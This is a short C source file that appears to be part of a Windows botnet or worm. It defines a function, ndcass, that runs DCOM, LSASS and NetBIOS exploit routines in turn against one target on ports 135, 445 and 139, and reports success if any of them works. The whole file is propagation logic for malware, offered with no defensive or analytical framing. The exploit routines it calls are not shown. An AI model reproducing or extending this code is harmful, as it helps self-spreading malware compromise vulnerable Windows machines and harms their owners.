

#include "includes.h"
#include "functions.h"
#include "externs.h"

#ifndef NO_LSASS
#ifndef NO_DCOM
#ifndef NO_NETBIOS
#ifndef NO_NDCASS
BOOL ndcass(EXINFO exinfo)
{
	exinfo.port = 135;
	BOOL bDCOM = dcom(exinfo);

	exinfo.port = 445;
	BOOL bLSASS = lsass(exinfo);

	exinfo.port = 139;
	BOOL bNETBIOS = NetBios(exinfo);
	exinfo.port = 445;
	BOOL bNTPASS = NetBios(exinfo);

	return bDCOM || bLSASS || bNETBIOS || bNTPASS ? TRUE : FALSE;
}
#endif
#endif
#endif
#endif

